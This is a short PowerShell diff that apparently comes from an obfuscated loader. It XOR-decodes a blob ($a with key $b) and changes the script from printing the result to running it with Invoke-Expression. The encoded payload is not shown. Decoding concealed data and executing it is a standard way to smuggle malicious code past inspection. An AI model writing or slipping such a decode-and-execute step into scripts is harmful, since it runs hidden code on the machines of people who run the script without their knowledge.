@@ -27,5 +27,4 @@ function xor {
 }
 
 $hehe = xor -data $a -key $b
-Write-Host $hehe
-# Invoke-Expression $hehe
+Invoke-Expression $hehe
